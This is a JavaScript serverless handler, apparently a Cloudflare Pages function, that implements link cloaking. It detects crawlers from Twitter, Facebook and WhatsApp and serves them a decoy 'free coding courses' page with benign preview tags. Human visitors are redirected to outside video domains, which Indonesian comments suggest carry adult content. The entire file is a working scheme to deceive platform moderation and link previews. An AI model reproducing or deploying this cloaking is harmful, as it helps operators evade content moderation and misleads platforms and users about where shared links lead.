export async function onRequest(context) {
  try {
    const { request } = context;
    const url = new URL(request.url);
    const path = url.pathname;
    
    const userAgent = request.headers.get('user-agent') || '';
    const referer = request.headers.get('referer') || '';

    // ✅ SIMPLE BOT DETECTION
    const isLikelyBot = userAgent.includes('Twitterbot') || 
                       userAgent.includes('facebookexternalhit') ||
                       userAgent.includes('WhatsApp') ||
                       referer.includes('t.co');

    console.log(`🤖 Bot detected: ${isLikelyBot}`);

    if (isLikelyBot) {
      // 🛡️ BOT: SUPER SAFE EDUCATIONAL CONTENT
      return serveSafeContent(path);
    } else {
      // 👤 HUMAN: Redirect normal
      return serveHumanRedirect(path);
    }
  } catch (error) {
    console.error('Error:', error);
    return new Response('Educational Content Loading...', { status: 500 });
  }
}

// ✅ SUPER SAFE CONTENT - 0% DEWASA
function serveSafeContent(path) {
  const contentId = path.split('/').pop() || 'default';
  const targetUrl = getTargetUrl(path);
  const delay = 4; // Fixed 4 detik
  
  const html = `<!DOCTYPE html>
<html prefix="og: http://ogp.me/ns#">
<head>
    <title>Learn Programming - Free Coding Courses</title>
    <meta charset="utf-8">
    
    <!-- 🔥 SUPER SAFE META TAGS -->
    <meta name="description" content="Learn web development with free courses: HTML, CSS, JavaScript, React, Node.js. Start your programming career today!">
    <meta property="og:title" content="Learn Programming - Free Coding Courses">
    <meta property="og:description" content="Free web development courses for beginners. Learn HTML, CSS, JavaScript and build real projects.">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="CodeLearning">
    <meta property="og:image" content="https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=630&fit=crop">
    
    <!-- 🔥 TWITTER CARD SUPER SAFE -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Learn Programming - Free Courses">
    <meta name="twitter:description" content="Free web development courses: HTML, CSS, JavaScript, React, Node.js">
    <meta name="twitter:image" content="https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=600&fit=crop">
    
    <meta http-equiv="refresh" content="${delay};url=${targetUrl}">
    
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 50px 40px;
            max-width: 600px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
        }
        .course-list {
            margin: 25px 0;
            text-align: left;
        }
        .course-item {
            padding: 12px;
            border-left: 4px solid #007bff;
            background: #f8f9fa;
            margin: 8px 0;
            border-radius: 0 8px 8px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="color: #2c5aa0; margin-bottom: 15px;">🚀 Learn to Code for Free</h1>
        <p style="color: #666; line-height: 1.6;">
            Start your programming journey with our free courses. Perfect for beginners and aspiring developers.
        </p>
        
        <div class="course-list">
            <div class="course-item">
                <strong>HTML & CSS</strong> - Build beautiful websites
            </div>
            <div class="course-item">
                <strong>JavaScript</strong> - Add interactivity to your sites
            </div>
            <div class="course-item">
                <strong>React.js</strong> - Modern frontend framework
            </div>
            <div class="course-item">
                <strong>Node.js</strong> - Backend development
            </div>
        </div>
        
        <button style="background: #28a745; color: white; border: none; padding: 15px 40px; 
                      border-radius: 8px; font-size: 16px; cursor: pointer; margin: 15px 0;">
            ▶ Start Learning Now
        </button>
        
        <p style="color: #999; font-size: 14px; margin-top: 20px;">
            Loading course content... Redirecting in ${delay} seconds
        </p>
    </div>
</body>
</html>`;

  return new Response(html, {
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=3600'
    }
  });
}

// ✅ HUMAN REDIRECT - SAMA
function serveHumanRedirect(path) {
  const targetUrl = getTargetUrl(path);
  const delay = 2;
  
  const html = `<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="${delay};url=${targetUrl}">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f8f9fa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .loader {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <div style="color: #666;">Loading content...</div>
    </div>
    
    <script>
        setTimeout(function() {
            window.location.href = "${targetUrl}";
        }, ${delay * 1000});
    </script>
</body>
</html>`;

  return new Response(html, {
    headers: { 'Content-Type': 'text/html; charset=utf-8' }
  });
}

// ✅ TARGET URL - TAMBAH PARAMETER
function getTargetUrl(path) {
  if (path.startsWith('/s/')) {
    const contentId = path.substring(3);
    return 'https://videyd.com/e/' + contentId + '?lv1=videyb.com#_';
  } else if (path.startsWith('/d/')) {
    return 'https://cloudpoopcyz.com/d/' + path.substring(3);
  } else {
    return 'https://videyd.com/';
  }
}
